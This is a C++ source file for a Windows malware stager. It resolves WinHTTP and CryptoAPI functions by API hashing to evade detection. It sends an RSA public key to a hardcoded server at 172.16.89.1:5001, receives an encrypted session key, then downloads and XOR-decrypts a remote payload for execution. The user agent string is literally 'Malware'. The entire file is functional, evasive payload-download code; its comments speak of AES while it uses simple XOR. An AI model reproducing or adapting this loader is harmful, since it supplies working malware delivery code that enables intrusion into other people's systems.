#include "Winhttp-Request.h"
#include "Custom-Functions.h"
#include "Hash.h"

void xor_decrypt(unsigned char* result, size_t data_len, unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        result[i] ^= key[i % key_len];
    }
}

EncryptedData getPayload()
{
    BYTE* pbFinalEncryptedData = nullptr;
    DWORD dwTotalDataLen = 0;
    EncryptedData result = { nullptr, 0 };

    //Section load winhttp.dll
    LPCSTR nameWinHttpDll = "winhttp.dll";
    HMODULE hWinHttp = LoadLibraryA(nameWinHttpDll);
    HMODULE hWinHttpA = GetModuleHandleA(nameWinHttpDll);

    // Section get the address of the functions WinHttp
    _WinHttpOpen WinHttpOpen = (_WinHttpOpen)getProcAddressCustom(hWinHttpA, WinHttpOpen_HASH);
    _WinHttpConnect WinHttpConnect = (_WinHttpConnect)getProcAddressCustom(hWinHttpA, WinHttpConnect_HASH);
    _WinHttpOpenRequest WinHttpOpenRequest = (_WinHttpOpenRequest)getProcAddressCustom(hWinHttpA, WinHttpOpenRequest_HASH);
    _WinHttpSendRequest WinHttpSendRequest = (_WinHttpSendRequest)getProcAddressCustom(hWinHttpA, WinHttpSendRequest_HASH);
    _WinHttpReceiveResponse WinHttpReceiveResponse = (_WinHttpReceiveResponse)getProcAddressCustom(hWinHttpA, WinHttpReceiveResponse_HASH);
    _WinHttpQueryDataAvailable WinHttpQueryDataAvailable = (_WinHttpQueryDataAvailable)getProcAddressCustom(hWinHttpA, WinHttpQueryDataAvailable_HASH);
    _WinHttpReadData WinHttpReadData = (_WinHttpReadData)getProcAddressCustom(hWinHttpA, WinHttpReadData_HASH);
    _WinHttpCloseHandle WinHttpCloseHandle = (_WinHttpCloseHandle)getProcAddressCustom(hWinHttpA, WinHttpCloseHandle_HASH);
    

    // Section load ADVAPI32.dll
    LPCSTR nameWinCryptDll = "ADVAPI32.dll";
    HMODULE hWinCrypt = LoadLibraryA(nameWinCryptDll);
    HMODULE hWinCryptA = GetModuleHandleA(nameWinCryptDll);

    _CryptAcquireContextW CryptAcquireContextW_H = (_CryptAcquireContextW)getProcAddressCustom(hWinCryptA, CryptAcquireContextW_HASH);
    _CryptGenKey CryptGenKey_H = (_CryptGenKey)getProcAddressCustom(hWinCryptA, CryptGenKey_HASH);
    _CryptExportKey CryptExportKey_H = (_CryptExportKey)getProcAddressCustom(hWinCryptA, CryptExportKey_HASH);
    _CryptDecrypt CryptDecrypt_H = (_CryptDecrypt)getProcAddressCustom(hWinCryptA, CryptDecrypt_HASH);
    _CryptDestroyKey CryptDestroyKey_H = (_CryptDestroyKey)getProcAddressCustom(hWinCryptA, CryptDestroyKey_HASH);
    _CryptReleaseContext CryptReleaseContext_H = (_CryptReleaseContext)getProcAddressCustom(hWinCryptA, CryptReleaseContext_HASH);
    
    // Create a RSA key pair.
    HCRYPTPROV hCryptProv;
    if (!CryptAcquireContextW_H(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_MACHINE_KEYSET)) {
        if (!CryptAcquireContextW_H(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_MACHINE_KEYSET | CRYPT_NEWKEYSET)) {
            return { nullptr, 0 };
        }
    }

   HCRYPTKEY hKey;
    if (!CryptGenKey_H(hCryptProv, AT_KEYEXCHANGE, CRYPT_EXPORTABLE, &hKey)) {
        return { nullptr, 0 };
    }

    // Export the public key.
    BYTE* pbPublicKeyBlob = NULL;
    DWORD dwPublicKeyBlobLength = 0;

    if (!CryptExportKey_H(hKey, NULL, PUBLICKEYBLOB, 0, NULL, &dwPublicKeyBlobLength)) {
        return { nullptr, 0 };
    }

    pbPublicKeyBlob = new BYTE[dwPublicKeyBlobLength];
    if (!CryptExportKey_H(hKey, NULL, PUBLICKEYBLOB, 0, pbPublicKeyBlob, &dwPublicKeyBlobLength)) {
        return { nullptr, 0 };
    }

    HINTERNET hSession = WinHttpOpen(L"Malware",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, L"172.16.89.1", 5001, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/payload/2", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    printf("[*] Sending request...\n");
    // Send a request with the public key.
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)pbPublicKeyBlob, dwPublicKeyBlobLength, dwPublicKeyBlobLength, 0)) {
        printf("Error %u WinHttpSendRequest.\n", GetLastError());
        return { nullptr, 0 };
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("Error %u WinHttpReceiveResponse.\n", GetLastError());
        return { nullptr, 0 };
    }


    printf("[*] Receiving...\n");

    DWORD dwAESKeyDataLen = 0;
    DWORD dwAESKeyDataLenBackup = 0;
    LPSTR pbAESKeyData = NULL;
    LPSTR pbAESKeyDataBackup = NULL;
    DWORD dwDownloaded = 0;
    do {
        // Allocate memory to store the encrypted message. 
        dwAESKeyDataLen = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwAESKeyDataLen))
            printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());

        pbAESKeyData = new char[dwAESKeyDataLen + 1];
        pbAESKeyDataBackup = new char[dwAESKeyDataLen + 1];


        if (!pbAESKeyData) {
            printf("Error allocating memory for the buffer.\n");
            dwAESKeyDataLen = 0;
        }
        else {
            // Read the data.
            ZeroMemory(pbAESKeyData, dwAESKeyDataLen + 1);
            if (!WinHttpReadData(hRequest, (LPVOID)pbAESKeyData, dwAESKeyDataLen, &dwDownloaded)) {
                printf("Error %u in WinHttpReadData.\n", GetLastError());
                return { nullptr, 0 };
            }
            else {
                // Store the encrypted data
                printf("%s", pbAESKeyData);
                
                if (!CryptDecrypt_H(hKey, 0, true, 0, (BYTE*)pbAESKeyData, &dwAESKeyDataLen)) {
					printf("Error %u in CryptDecrypt.\n", GetLastError());
					return { nullptr, 0 };
				}

                pbAESKeyData[dwAESKeyDataLen] = '\0';
                dwAESKeyDataLenBackup = dwAESKeyDataLen;
                
                dwAESKeyDataLen = 0;
            }

            dwTotalDataLen += dwDownloaded;
        }

        //delete[] pbPublicKeyBlob;

    } while (dwAESKeyDataLen > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    

    // Section to get the encrypted payload from the server and decrypt it with the AES key
    hSession = WinHttpOpen(L"Malware",
        		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        		WINHTTP_NO_PROXY_NAME,
        		WINHTTP_NO_PROXY_BYPASS, 0);

    hConnect = WinHttpConnect(hSession, L"172.16.89.1", 5001, 0);

    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/payload/2", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    printf("[*] Sending request...\n");
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
        printf("Error %u WinHttpSendRequest.\n", GetLastError());
        return { nullptr, 0 };
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("Error %u WinHttpReceiveResponse.\n", GetLastError());
        return { nullptr, 0 };
    }
    
    DWORD dwEncryptedDataLen = 0;
    DWORD dwEncryptedDataLenBackup = 0;
    LPSTR pbEncryptedData = NULL;
    LPSTR pbEncryptedDataBackup = NULL;
    dwDownloaded = 0;
    
    do {
        // Allocate memory to store the encrypted message. 
        dwEncryptedDataLen = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwEncryptedDataLen)) {
            printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
        }

        pbEncryptedData = new char[dwEncryptedDataLen + 1];
        pbEncryptedDataBackup = new char[dwEncryptedDataLen + 1];
        
        if (!pbEncryptedData) {
            printf("Error allocating memory for the buffer.\n");
            dwEncryptedDataLen = 0;
        }
        else
        {
            // Read the data.
            ZeroMemory(pbEncryptedData, dwEncryptedDataLen + 1);
            if (!WinHttpReadData(hRequest, (LPVOID)pbEncryptedData, dwEncryptedDataLen, &dwDownloaded)) {
                printf("Error %u in WinHttpReadData.\n", GetLastError());
                return { nullptr, 0 };
            }
            else {
                printf("%s", pbEncryptedData);

                // Decrypt the message.
                xor_decrypt((unsigned char*)pbEncryptedData, (size_t)dwEncryptedDataLen, (unsigned char*)pbAESKeyData, (size_t)dwAESKeyDataLenBackup);
                dwEncryptedDataLenBackup = dwEncryptedDataLen;
                dwEncryptedDataLen = 0;
                printf("%s", pbEncryptedData);
            }
        }
    } while (dwEncryptedDataLen > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    CryptDestroyKey_H(hKey);
    CryptReleaseContext_H(hCryptProv, 0);

    result.data = pbEncryptedData;
    result.size = dwEncryptedDataLenBackup;

    return result;
}